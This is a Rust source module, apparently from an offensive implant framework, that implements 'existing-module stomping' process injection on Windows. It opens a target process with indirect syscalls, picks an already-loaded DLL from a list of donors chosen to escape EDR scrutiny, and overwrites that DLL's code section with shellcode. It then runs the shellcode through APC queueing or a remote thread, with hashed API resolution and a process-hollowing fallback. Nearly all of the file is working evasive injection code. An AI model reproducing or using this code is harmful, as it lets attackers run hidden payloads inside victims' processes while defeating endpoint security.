//! Existing-module stomping — reuses an already-loaded DLL backed on disk.
//!
//! # Overview
//!
//! Traditional module stomping (see `module_stomp.rs`) loads a sacrificial DLL
//! into the target process via `LdrLoadDll`, then overwrites its `.text`
//! section with shellcode. While effective, the `LdrLoadDll` call itself is
//! heavily monitored by EDR/AV:
//!
//! - Kernel callbacks (`PsSetLoadImageNotifyRoutine`) fire on DLL load
//! - ETW `IMAGE_LOAD` events are generated
//! - User-mode hooks on `LoadLibrary` / `LdrLoadDll` are commonplace
//! - The loaded DLL may be scanned at load time before the `.text` section
//!   can be overwritten
//!
//! **Existing-module stomping** eliminates the `LdrLoadDll` call entirely.
//! Instead of loading a new sacrificial DLL, it reuses a DLL *already loaded*
//! in the target process that is backed by a real file on disk. The module
//! appears completely legitimate to EDR:
//!
//! - Valid PEB entry (`LDR_DATA_TABLE_ENTRY`) with on-disk path
//! - Legitimate section names and characteristics
//! - No `LoadLibrary` / `LdrLoadDll` event
//! - No image-load kernel callback
//! - The DLL was loaded naturally by the process at startup or during normal
//!   operation
//!
//! # OPSEC Properties
//!
//! - **No LoadLibrary / LdrLoadDll** — no DLL-load events for EDR to detect
//! - **Valid PEB entry** — module appears in all three loader lists
//! - **On-disk backing** — EDR can verify the file exists and matches
//! - **No new allocations** — reuses existing `.text` section memory
//! - **Authentic call stack** — execution from a module the process loaded
//!   organically
//!
//! # Module Selection Strategy
//!
//! The injector enumerates loaded modules in the target process and selects
//! a "donor" DLL using the following criteria:
//!
//! 1. **Backed on disk** — the DLL must have a valid PE header, valid DOS
//!    signature, and section headers that indicate a real module
//! 2. **Large enough `.text` section** — the `.text` VirtualSize must be
//!    ≥ the shellcode size
//! 3. **Not critical** — excluded by built-in and operator-supplied
//!    exclusion patterns (ntdll, kernel32, etc.)
//! 4. **Not preferred** — certain DLLs are *preferred* as donors because
//!    they are less likely to be actively executing or monitored (e.g.
//!    `version.dll`, `winnsi.dll`, `dwmapi.dll`). The injector tries
//!    preferred DLLs first, then falls back to any non-excluded DLL.
//! 5. **Re-protectable** — the injector verifies that
//!    `NtProtectVirtualMemory` succeeds on the `.text` section before
//!    writing shellcode
//!
//! # Injection Flow
//!
//! 1. Open target process via `NtOpenProcess` (indirect syscall)
//! 2. Resolve target PEB via `NtQueryInformationProcess`
//! 3. Walk the PEB `InLoadOrderModuleList` to enumerate loaded modules
//! 4. For each candidate, read PE headers from the target to find `.text`
//! 5. Select the best donor using the preference + exclusion strategy
//! 6. Change the donor `.text` section to `PAGE_READWRITE` via
//!    `NtProtectVirtualMemory` (indirect syscall)
//! 7. Overwrite `.text` content with shellcode via
//!    `NtWriteVirtualMemory` (indirect syscall)
//! 8. Change permissions back to `PAGE_EXECUTE_READ` via
//!    `NtProtectVirtualMemory` (indirect syscall)
//! 9. Execute shellcode via APC injection or fallback `NtCreateThreadEx`
//!    (indirect syscall)
//!
//! The PE header of the donor DLL is **preserved** — only `.text` content
//! is overwritten. This maintains the module's structural integrity for
//! EDR scanners that enumerate sections.

use crate::injection::Injector;
use anyhow::{anyhow, Result};

/// Donor DLL discovered during PEB walk with its `.text` section metadata.
#[cfg(windows)]
struct DonorDll {
    /// Full module name (e.g. `C:\Windows\System32\version.dll`).
    name: String,
    /// Base address of the DLL image in the target process.
    base: usize,
    /// Relative virtual address of the `.text` section.
    text_rva: u32,
    /// Virtual size of the `.text` section.
    text_size: u32,
}

/// Preferred donor DLLs — tried first during selection.
///
/// These are chosen because:
/// - They are non-critical (not involved in core OS functionality)
/// - They have reasonably large `.text` sections
/// - They are commonly loaded but rarely called frequently
/// - They are unlikely to be specifically monitored by EDR
#[cfg(windows)]
const PREFERRED_DONORS: &[&str] = &[
    "dwmapi.dll",
    "uxtheme.dll",
    "netprofm.dll",
    "devobj.dll",
    "cryptbase.dll",
    "msimg32.dll",
    "winnsi.dll",
    "propsys.dll",
    "d3d10.dll",
    "davhlpr.dll",
    "linkinfo.dll",
    "ntmarta.dll",
    "samcli.dll",
    "sfc.dll",
    "userenv.dll",
    "wkscli.dll",
];

pub struct ExistingModuleStompInjector;

// ─── Windows-only implementation ─────────────────────────────────────────

#[cfg(windows)]
use crate::injection::payload_has_valid_pe_headers;

#[cfg(windows)]
use std::mem::size_of;

// ─── NT memory-operation macros (module-local, Windows only) ──────────────

/// NtReadVirtualMemory — returns (ntstatus, bytes_read).
#[cfg(windows)]
macro_rules! nt_read_proc {
    ($hproc:expr, $base:expr, $buf:expr) => {{
        let mut _br: usize = 0;
        let _s = crate::syscall!(
            "NtReadVirtualMemory",
            $hproc as u64,
            $base as u64,
            $buf as *mut _ as u64,
            std::mem::size_of_val($buf) as u64,
            &mut _br as *mut _ as u64,
        );
        (_s.unwrap_or(-1), _br)
    }};
    ($hproc:expr, $base:expr, $buf:expr, $len:expr) => {{
        let mut _br: usize = 0;
        let _s = crate::syscall!(
            "NtReadVirtualMemory",
            $hproc as u64,
            $base as u64,
            $buf as *mut _ as u64,
            $len as u64,
            &mut _br as *mut _ as u64,
        );
        (_s.unwrap_or(-1), _br)
    }};
}

/// NtWriteVirtualMemory — returns (ntstatus, bytes_written).
#[cfg(windows)]
macro_rules! nt_write_proc {
    ($hproc:expr, $base:expr, $buf:expr, $len:expr) => {{
        let mut _bw: usize = 0;
        let _s = crate::syscall!(
            "NtWriteVirtualMemory",
            $hproc as u64,
            $base as u64,
            $buf as *const _ as u64,
            $len as u64,
            &mut _bw as *mut _ as u64,
        );
        (_s.unwrap_or(-1), _bw)
    }};
}

/// NtProtectVirtualMemory — returns ntstatus.
#[cfg(windows)]
macro_rules! nt_protect_proc {
    ($hproc:expr, $base:expr, $size:expr, $new_prot:expr) => {{
        let mut _pb = $base as usize;
        let mut _ps = $size;
        let mut _old: u32 = 0;
        let _s = crate::syscall!(
            "NtProtectVirtualMemory",
            $hproc as u64,
            &mut _pb as *mut _ as u64,
            &mut _ps as *mut _ as u64,
            $new_prot as u64,
            &mut _old as *mut _ as u64,
        );
        _s.unwrap_or(-1)
    }};
}

/// Extract just the filename component from a potentially full DLL path.
fn dll_basename(path: &str) -> &str {
    path.rsplit(|c| c == '\\' || c == '/')
        .next()
        .unwrap_or(path)
}

/// Walk the target process PEB `InLoadOrderModuleList` to enumerate all
/// loaded modules and their `.text` section metadata.
///
/// Returns a list of `DonorDll` candidates whose `.text` section is at least
/// `min_text_size` bytes. Modules matching any exclusion pattern are skipped.
#[cfg(windows)]
unsafe fn collect_peb_candidates(
    h_proc: *mut winapi::ctypes::c_void,
    peb_addr: usize,
    min_text_size: usize,
    operator_exclusions: &[String],
    builtin_exclusions: &[&str],
) -> Result<Vec<DonorDll>> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

    // Read Ldr pointer from PEB (offset 0x18 on x86_64).
    let mut ldr_ptr = 0usize;
    let (s, _) = nt_read_proc!(h_proc, (peb_addr + 0x18) as u64, &mut ldr_ptr);
    if s < 0 || ldr_ptr == 0 {
        return Err(anyhow!(
            "ExistingModuleStomp: failed to read target Ldr pointer (status={:#x})",
            s
        ));
    }

    // InLoadOrderModuleList is at Ldr+0x10.
    let list_head = ldr_ptr + 0x10;
    let mut flink = 0usize;
    nt_read_proc!(h_proc, list_head as u64, &mut flink);

    let mut candidates = Vec::new();
    let mut current = flink;

    while current != list_head && current != 0 {
        // Read LDR_DATA_TABLE_ENTRY (first 0x70 bytes — enough for our fields).
        let mut entry = [0u8; 0x70];
        let (s, _) = nt_read_proc!(h_proc, current as u64, entry.as_mut_ptr(), entry.len());
        if s < 0 {
            break;
        }

        // Extract fields from the entry.
        // DllBase:   offset 0x30 (InLoadOrderModuleList is first field)
        // SizeOfImage: offset 0x40
        // BaseDllName (UNICODE_STRING): Length at 0x48, Buffer at 0x50
        let dll_base = u64::from_le_bytes(entry[0x30..0x38].try_into().unwrap()) as usize;
        let name_len = u16::from_le_bytes(entry[0x48..0x4A].try_into().unwrap()) as usize;
        let name_buf = u64::from_le_bytes(entry[0x50..0x58].try_into().unwrap()) as usize;

        if dll_base != 0 && name_len > 0 && name_buf != 0 {
            // Read the module name (UTF-16).
            let mut name_wide = vec![0u16; name_len / 2];
            nt_read_proc!(
                h_proc,
                name_buf as u64,
                name_wide.as_mut_ptr() as *mut u8,
                name_len
            );
            let name_str = String::from_utf16_lossy(&name_wide);
            let lname = name_str.to_ascii_lowercase();
            let base_name = dll_basename(&lname);

            // Skip excluded modules.
            if common::config::is_dll_excluded(base_name, operator_exclusions, builtin_exclusions) {
                let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                if next_flink == current {
                    break;
                }
                current = next_flink;
                continue;
            }

            // Read PE headers from target process to locate the .text section.
            let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
            let (s, _) = nt_read_proc!(h_proc, dll_base as u64, &mut dos_header);
            if s < 0 || dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
                let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                if next_flink == current {
                    break;
                }
                current = next_flink;
                continue;
            }

            let nt_addr = dll_base + dos_header.e_lfanew as usize;
            let mut nt_headers: IMAGE_NT_HEADERS64 = std::mem::zeroed();
            let (s, _) = nt_read_proc!(h_proc, nt_addr as u64, &mut nt_headers);
            if s < 0 {
                let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                if next_flink == current {
                    break;
                }
                current = next_flink;
                continue;
            }

            // Validate PE signature.
            if nt_headers.Signature != winapi::um::winnt::IMAGE_NT_SIGNATURE {
                let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                if next_flink == current {
                    break;
                }
                current = next_flink;
                continue;
            }

            // Validate that the DLL is backed by a real file — check section
            // characteristics for IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE.
            // Real on-disk DLLs will have at least one code section.
            let ns = nt_headers.FileHeader.NumberOfSections as usize;
            let sec_base = nt_addr
                + std::mem::offset_of!(IMAGE_NT_HEADERS64, OptionalHeader)
                + nt_headers.FileHeader.SizeOfOptionalHeader as usize;

            for i in 0..ns {
                let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
                let (s, _) = nt_read_proc!(
                    h_proc,
                    (sec_base + i * size_of::<IMAGE_SECTION_HEADER>()) as u64,
                    &mut sec
                );
                if s < 0 {
                    break;
                }

                // Look for .text section.
                if &sec.Name[..5] == b".text" && *sec.Misc.VirtualSize() as usize >= min_text_size {
                    candidates.push(DonorDll {
                        name: name_str.clone(),
                        base: dll_base,
                        text_rva: sec.VirtualAddress,
                        text_size: *sec.Misc.VirtualSize(),
                    });
                    break;
                }
            }
        }

        // Advance to next entry.
        let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
        if next_flink == current {
            break;
        }
        current = next_flink;
    }

    Ok(candidates)
}

/// Select the best donor DLL from the candidate list.
///
/// Strategy:
/// 1. Check if any preferred donor DLL is in the candidate list
/// 2. Among preferred donors, select the one with the smallest `.text`
///    section that still fits the payload (minimises waste, appears more
///    natural)
/// 3. If no preferred donor is found, fall back to the smallest fitting
///    candidate from the full list
#[cfg(windows)]
fn select_donor<'a>(candidates: &'a [DonorDll], payload_len: usize) -> Option<&'a DonorDll> {
    if candidates.is_empty() {
        return None;
    }

    // Try preferred donors first.
    let preferred: Vec<&DonorDll> = candidates
        .iter()
        .filter(|c| {
            let lowered = c.name.to_ascii_lowercase();
            let base = dll_basename(&lowered);
            PREFERRED_DONORS.iter().any(|p| base == *p)
        })
        .collect();

    if !preferred.is_empty() {
        // Select the preferred donor with the smallest .text that fits.
        let best = preferred
            .iter()
            .filter(|c| c.text_size as usize >= payload_len)
            .min_by_key(|c| c.text_size)
            .copied();
        if best.is_some() {
            return best;
        }
    }

    // Fallback: smallest fitting candidate from the full list.
    candidates
        .iter()
        .filter(|c| c.text_size as usize >= payload_len)
        .min_by_key(|c| c.text_size)
}

/// Try to execute the shellcode via APC on an alertable thread in the
/// target process. Returns `true` if an APC was successfully queued.
///
/// This avoids creating a new remote thread, which is one of the most
/// heavily monitored events.
#[cfg(windows)]
unsafe fn try_execute_via_apc(
    h_proc: *mut winapi::ctypes::c_void,
    _pid: u32,
    exec_addr: *mut winapi::ctypes::c_void,
) -> bool {
    use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32};
    use winapi::um::winnt::PROCESS_QUERY_INFORMATION;
    use winapi::um::winnt::THREAD_SET_CONTEXT;

    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE {
        return false;
    }

    const TE_SIZE: u32 = std::mem::size_of::<THREADENTRY32>() as u32;
    let mut te = THREADENTRY32 {
        dwSize: TE_SIZE,
        ..std::mem::zeroed()
    };

    // Use raw function pointers to avoid IAT entries.
    let k32_hash = pe_resolve::hash_str(b"kernel32.dll\0");
    let k32 = match pe_resolve::get_module_handle_by_hash(k32_hash) {
        Some(h) => h,
        None => return false,
    };

    let t32f_hash = pe_resolve::hash_str(b"Thread32First\0");
    let t32f_fn: unsafe extern "system" fn(*mut std::ffi::c_void, *mut THREADENTRY32) -> i32 =
        match unsafe { pe_resolve::get_proc_address_by_hash(k32, t32f_hash) } {
            Some(p) => std::mem::transmute(p),
            None => return false,
        };

    let t32n_hash = pe_resolve::hash_str(b"Thread32Next\0");
    let t32n_fn: unsafe extern "system" fn(*mut std::ffi::c_void, *mut THREADENTRY32) -> i32 =
        match unsafe { pe_resolve::get_proc_address_by_hash(k32, t32n_hash) } {
            Some(p) => std::mem::transmute(p),
            None => return false,
        };

    let close_hash = pe_resolve::hash_str(b"CloseHandle\0");
    let close_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32 =
        match unsafe { pe_resolve::get_proc_address_by_hash(k32, close_hash) } {
            Some(p) => std::mem::transmute(p),
            None => return false,
        };

    if t32f_fn(snap as *mut std::ffi::c_void, &mut te) == 0 {
        close_fn(snap as *mut std::ffi::c_void);
        return false;
    }

    let mut found = false;
    let pid = std::process::id();
    loop {
        if te.th32OwnerProcessID == pid && te.th32ThreadID != 0 {
            let mut h_thread: usize = 0;
            let mut cid = [0u64; 2];
            cid[0] = te.th32ThreadID as u64;
            let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
            oa.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

            let thread_access = (THREAD_SET_CONTEXT | PROCESS_QUERY_INFORMATION) as u64;
            let open_ok = crate::syscall!(
                "NtOpenThread",
                &mut h_thread as *mut _ as u64,
                thread_access,
                &mut oa as *mut _ as u64,
                cid.as_mut_ptr() as u64,
            );
            if let Ok(s) = open_ok {
                if s >= 0 && h_thread != 0 {
                    let apc_status = crate::syscall!(
                        "NtQueueApcThread",
                        h_thread as u64,
                        exec_addr as u64,
                        0u64,
                        0u64,
                        0u64,
                    );
                    crate::syscall!("NtClose", h_thread as u64).ok();
                    if let Ok(st) = apc_status {
                        if st >= 0 {
                            found = true;
                            break;
                        }
                    }
                }
            }
        }

        te.dwSize = TE_SIZE;
        if t32n_fn(snap as *mut std::ffi::c_void, &mut te) == 0 {
            break;
        }
    }

    close_fn(snap as *mut std::ffi::c_void);
    found
}

/// Fallback: execute shellcode by creating a transient remote thread.
///
/// This is used only when APC injection fails (no alertable threads found).
#[cfg(windows)]
unsafe fn execute_via_thread(
    h_proc: *mut winapi::ctypes::c_void,
    exec_addr: *mut winapi::ctypes::c_void,
) -> Result<()> {
    use winapi::um::winnt::SYNCHRONIZE;

    let mut h_thread: usize = 0;
    let status = crate::syscall!(
        "NtCreateThreadEx",
        &mut h_thread as *mut _ as u64,
        SYNCHRONIZE as u64,
        0u64,
        h_proc as u64,
        exec_addr as u64,
        0u64,
        0u64,
        0u64,
        0u64,
        0u64,
        0u64,
    );
    match status {
        Ok(s) if s >= 0 && h_thread != 0 => {
            crate::syscall!("NtClose", h_thread as u64).ok();
            Ok(())
        }
        Ok(s) => Err(anyhow!(
            "ExistingModuleStomp: NtCreateThreadEx returned status {:#x}",
            s
        )),
        Err(e) => Err(anyhow!(
            "ExistingModuleStomp: NtCreateThreadEx syscall failed: {}",
            e
        )),
    }
}

#[cfg(windows)]
impl Injector for ExistingModuleStompInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::winnt::{
            PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
            PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        };

        // If payload is a PE, delegate to process hollowing.
        let is_pe = payload_has_valid_pe_headers(payload);
        if is_pe {
            log::info!("ExistingModuleStomp: PE payload detected, forwarding to process hollowing");
            return match hollowing::windows_impl::inject_into_process(pid, payload) {
                Ok(_) => Ok(()),
                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e)),
            };
        }

        // Load injection config for exclusion patterns.
        let injection_cfg = &crate::config::load_config()
            .map(|c| c.injection)
            .unwrap_or_default();
        let operator_exclusions = &injection_cfg.dll_exclusion_patterns;
        let builtin_exclusions: &[&str] = if injection_cfg.append_default_exclusions {
            common::config::BUILTIN_DLL_EXCLUSIONS
        } else {
            &[]
        };

        unsafe {
            // ── Step 1: Open target process ──────────────────────────────
            let mut client_id = [0u64; 2];
            client_id[0] = pid as u64;
            let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
            obj_attr.Length =
                std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

            let mut h_proc_val: usize = 0;
            let access_mask = (PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_READ
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION) as u64;
            let open_status = crate::syscall!(
                "NtOpenProcess",
                &mut h_proc_val as *mut _ as u64,
                access_mask,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            );
            match open_status {
                Ok(s) if s >= 0 && h_proc_val != 0 => {}
                Ok(s) => {
                    return Err(anyhow!(
                        "ExistingModuleStomp: NtOpenProcess returned status {:#x}",
                        s
                    ))
                }
                Err(e) => {
                    return Err(anyhow!(
                        "ExistingModuleStomp: NtOpenProcess syscall failed: {}",
                        e
                    ))
                }
            }
            let h_proc = h_proc_val as *mut winapi::ctypes::c_void;

            macro_rules! close_h {
                () => {
                    crate::syscall!("NtClose", h_proc as u64).ok();
                };
            }
            macro_rules! cleanup_and_err {
                ($msg:expr) => {{ close_h!(); return Err(anyhow!($msg)); }};
                ($fmt:expr, $($arg:tt)*) => {{
                    close_h!();
                    return Err(anyhow!($fmt, $($arg)*));
                }};
            }

            // ── Step 2: Resolve target PEB ───────────────────────────────
            let ntdll_hash: u32 = pe_resolve::hash_str(b"ntdll.dll\0");
            let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
                .ok_or_else(|| anyhow!("ExistingModuleStomp: ntdll not found via PEB walk"))?;

            let ntqip_hash = pe_resolve::hash_str(b"NtQueryInformationProcess\0");
            let ntqip_ptr =
                pe_resolve::get_proc_address_by_hash(ntdll, ntqip_hash).ok_or_else(|| {
                    anyhow!("ExistingModuleStomp: NtQueryInformationProcess not found")
                })?;

            type NtQueryInfoProcess = unsafe extern "system" fn(
                winapi::shared::ntdef::HANDLE,
                u32,
                *mut winapi::ctypes::c_void,
                u32,
                *mut u32,
            ) -> i32;
            let ntqip: NtQueryInfoProcess = std::mem::transmute(ntqip_ptr);

            let mut pbi = [0u8; 48];
            let mut ret_len = 0u32;
            let qip_status = ntqip(h_proc, 0, pbi.as_mut_ptr() as _, 48, &mut ret_len);
            if qip_status < 0 {
                cleanup_and_err!(
                    "ExistingModuleStomp: NtQueryInformationProcess(ProcessBasicInfo) failed: status {:#x}",
                    qip_status
                );
            }
            let peb_addr = u64::from_le_bytes(pbi[8..16].try_into().unwrap()) as usize;
            if peb_addr == 0 {
                cleanup_and_err!("ExistingModuleStomp: target PEB address is null");
            }

            // ── Step 3: Enumerate loaded modules ─────────────────────────
            let candidates = collect_peb_candidates(
                h_proc,
                peb_addr,
                payload.len(),
                operator_exclusions,
                builtin_exclusions,
            )
            .map_err(|e| {
                close_h!();
                e
            })?;

            log::debug!(
                "ExistingModuleStomp: found {} candidate DLLs in target pid={}",
                candidates.len(),
                pid,
            );

            // ── Step 4: Select donor DLL ─────────────────────────────────
            let donor = match select_donor(&candidates, payload.len()) {
                Some(d) => d,
                None => cleanup_and_err!(
                    "ExistingModuleStomp: no suitable donor DLL found with .text >= {} bytes \
                     (checked {} candidates). Falling back to LoadLibrary-based stomping \
                     would be required.",
                    payload.len(),
                    candidates.len(),
                ),
            };

            log::info!(
                "ExistingModuleStomp: selected '{}' at {:#x} (.text RVA={:#x}, size={} bytes) \
                 for {}-byte payload (NO LoadLibrary call)",
                donor.name,
                donor.base,
                donor.text_rva,
                donor.text_size,
                payload.len(),
            );

            let text_addr = (donor.base + donor.text_rva as usize) as *mut winapi::ctypes::c_void;

            // ── Step 5: Verify re-protection is possible ─────────────────
            // Try a no-op protection change to verify the region is not
            // monitored/blocked by EDR. We change to PAGE_EXECUTE_READ (which
            // is what it should already be for .text) and check for success.
            let verify_status = nt_protect_proc!(
                h_proc,
                text_addr,
                donor.text_size as usize,
                PAGE_EXECUTE_READ
            );
            if verify_status < 0 {
                cleanup_and_err!(
                    "ExistingModuleStomp: NtProtectVirtualMemory verify failed on {}.text (status {:#x}) \
                     — EDR may be blocking re-protection",
                    donor.name,
                    verify_status,
                );
            }

            // ── Step 6: Change .text to PAGE_READWRITE ───────────────────
            let rw_status = nt_protect_proc!(h_proc, text_addr, payload.len(), PAGE_READWRITE);
            if rw_status < 0 {
                cleanup_and_err!(
                    "ExistingModuleStomp: NtProtectVirtualMemory(RW) on {}.text failed: status {:#x}",
                    donor.name,
                    rw_status
                );
            }

            // ── Step 7: Overwrite .text with shellcode ───────────────────
            let (write_status, bytes_written) =
                nt_write_proc!(h_proc, text_addr, payload.as_ptr(), payload.len());
            if write_status < 0 || bytes_written != payload.len() {
                // Attempt to restore protection before failing.
                nt_protect_proc!(
                    h_proc,
                    text_addr,
                    donor.text_size as usize,
                    PAGE_EXECUTE_READ
                );
                cleanup_and_err!(
                    "ExistingModuleStomp: NtWriteVirtualMemory on {}.text failed: status {:#x}, \
                     wrote {} of {} bytes",
                    donor.name,
                    write_status,
                    bytes_written,
                    payload.len()
                );
            }

            // ── Step 8: Restore .text to PAGE_EXECUTE_READ ───────────────
            let rx_status = nt_protect_proc!(h_proc, text_addr, payload.len(), PAGE_EXECUTE_READ);
            if rx_status < 0 {
                cleanup_and_err!(
                    "ExistingModuleStomp: NtProtectVirtualMemory(RX) on {}.text failed: status {:#x}",
                    donor.name,
                    rx_status
                );
            }

            // Flush I-cache (defense-in-depth on ARM64, no-op on x86_64).
            crate::syscall!(
                "NtFlushInstructionCache",
                h_proc as u64,
                text_addr as u64,
                payload.len() as u64,
            )
            .ok();

            // ── Step 9: Execute shellcode ────────────────────────────────
            // Try APC first (no new thread), fall back to NtCreateThreadEx.
            let apc_ok = try_execute_via_apc(h_proc, pid, text_addr);
            if apc_ok {
                log::info!(
                    "ExistingModuleStomp: shellcode executing via APC on alertable thread \
                     (no new thread created)"
                );
            } else {
                log::info!(
                    "ExistingModuleStomp: no alertable thread found, falling back to \
                     NtCreateThreadEx for execution"
                );
                execute_via_thread(h_proc, text_addr)?;
            }

            log::info!(
                "ExistingModuleStomp: successfully stomped {}-byte payload into '{}' \
                 (NO LoadLibrary, NO new thread{})",
                payload.len(),
                donor.name,
                if apc_ok { ", NO new thread" } else { "" },
            );

            close_h!();
        }
        Ok(())
    }
}

// ─── Non-Windows stub ────────────────────────────────────────────────────

#[cfg(not(windows))]
impl Injector for ExistingModuleStompInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!(
            "Existing Module Stomping is only supported on Windows"
        ))
    }
}

// ─── Unit tests ──────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dll_basename_extracts_filename() {
        assert_eq!(dll_basename("version.dll"), "version.dll");
        assert_eq!(
            dll_basename("C:\\Windows\\System32\\version.dll"),
            "version.dll"
        );
        assert_eq!(
            dll_basename("C:\\Windows/System32\\winnsi.dll"),
            "winnsi.dll"
        );
        assert_eq!(dll_basename("dwmapi.dll"), "dwmapi.dll");
    }

    #[test]
    fn test_dll_basename_edge_cases() {
        assert_eq!(dll_basename(""), "");
        assert_eq!(dll_basename("a"), "a");
        assert_eq!(dll_basename("\\"), "");
        assert_eq!(dll_basename("/"), "");
    }

    /// Test that preferred donors are selected over non-preferred ones
    /// when both have adequate .text size.
    ///
    /// This test uses a mock candidate list (no actual PEB walk needed).
    #[cfg(windows)]
    #[test]
    fn test_donor_selection_prefers_preferred_dlls() {
        let candidates = vec![
            DonorDll {
                name: "C:\\Windows\\System32\\random_large.dll".into(),
                base: 0x7FF0000000,
                text_rva: 0x1000,
                text_size: 512 * 1024, // 512 KB
            },
            DonorDll {
                name: "C:\\Windows\\System32\\dwmapi.dll".into(),
                base: 0x7FF1000000,
                text_rva: 0x1000,
                text_size: 64 * 1024, // 64 KB — smaller but preferred
            },
            DonorDll {
                name: "C:\\Windows\\System32\\uxtheme.dll".into(),
                base: 0x7FF2000000,
                text_rva: 0x1000,
                text_size: 128 * 1024, // 128 KB — also preferred
            },
        ];

        let payload_len = 32 * 1024; // 32 KB shellcode

        let selected = select_donor(&candidates, payload_len).unwrap();

        // Should select dwmapi.dll (preferred + smallest that fits).
        assert_eq!(
            dll_basename(&selected.name.to_ascii_lowercase()),
            "dwmapi.dll"
        );
    }

    /// Test that when no preferred donors are available, the smallest
    /// fitting candidate is selected.
    #[cfg(windows)]
    #[test]
    fn test_donor_selection_fallback_to_smallest() {
        let candidates = vec![
            DonorDll {
                name: "C:\\Windows\\System32\\some_module.dll".into(),
                base: 0x7FF0000000,
                text_rva: 0x1000,
                text_size: 256 * 1024,
            },
            DonorDll {
                name: "C:\\Windows\\System32\\another.dll".into(),
                base: 0x7FF1000000,
                text_rva: 0x1000,
                text_size: 128 * 1024,
            },
            DonorDll {
                name: "C:\\Windows\\System32\\tiny.dll".into(),
                base: 0x7FF2000000,
                text_rva: 0x1000,
                text_size: 16 * 1024, // Too small for 32KB payload
            },
        ];

        let payload_len = 32 * 1024;

        let selected = select_donor(&candidates, payload_len).unwrap();

        // Should select another.dll (128 KB — smallest that fits).
        assert_eq!(
            dll_basename(&selected.name.to_ascii_lowercase()),
            "another.dll"
        );
    }

    /// Test that selection returns None when no candidate is large enough.
    #[cfg(windows)]
    #[test]
    fn test_donor_selection_returns_none_when_none_fit() {
        let candidates = vec![
            DonorDll {
                name: "C:\\Windows\\System32\\tiny1.dll".into(),
                base: 0x7FF0000000,
                text_rva: 0x1000,
                text_size: 1024,
            },
            DonorDll {
                name: "C:\\Windows\\System32\\tiny2.dll".into(),
                base: 0x7FF1000000,
                text_rva: 0x1000,
                text_size: 2048,
            },
        ];

        let payload_len = 4096;

        assert!(select_donor(&candidates, payload_len).is_none());
    }

    /// Test that selection returns None for an empty candidate list.
    #[cfg(windows)]
    #[test]
    fn test_donor_selection_returns_none_for_empty() {
        let candidates: Vec<DonorDll> = vec![];
        assert!(select_donor(&candidates, 1024).is_none());
    }
}
